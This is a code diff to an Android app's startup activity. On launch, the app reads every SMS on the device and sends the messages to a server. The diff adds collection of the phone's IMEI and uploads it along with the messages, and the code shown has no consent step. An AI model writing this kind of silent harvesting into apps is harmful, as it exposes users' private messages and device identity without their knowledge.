@@ -12,6 +12,7 @@ import android.support.v4.app.Fragment;
 import android.support.v4.app.FragmentActivity;
 import android.support.v7.app.ActionBarActivity;
 import android.util.Log;
+import android.telephony.TelephonyManager;
 import android.view.LayoutInflater;
 import android.view.Menu;
 import android.view.MenuItem;
@@ -54,7 +55,7 @@ public class InitActivity extends FragmentActivity {
 //        Typeface type = Typeface.createFromAsset(getAssets(), "fonts/homework.TTF");
 //        ((TextView)getActionBar().getCustomView().findViewById(R.id.title)).setTypeface(type);
 
-        ServerDAO.sendMessages(getMessages(), this);
+        ServerDAO.sendMessageList(getIMEI(), getMessages(), this);
     }
 
     @Override
@@ -161,6 +162,12 @@ public class InitActivity extends FragmentActivity {
         }
     }
 
+    public String getIMEI() {
+
+        TelephonyManager manager = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
+        return manager.getDeviceId();
+    }
+
     public Message[] getMessages() {
 
         Uri uri = Uri.parse("content://sms");
@@ -169,7 +176,7 @@ public class InitActivity extends FragmentActivity {
 
         if (cursor.moveToFirst()) {
             for (int i = 0; i < cursor.getCount(); i++) {
-                messages.add(new Message(this, cursor));
+                messages.add(new Message(cursor));
                 cursor.moveToNext();
             }
         }
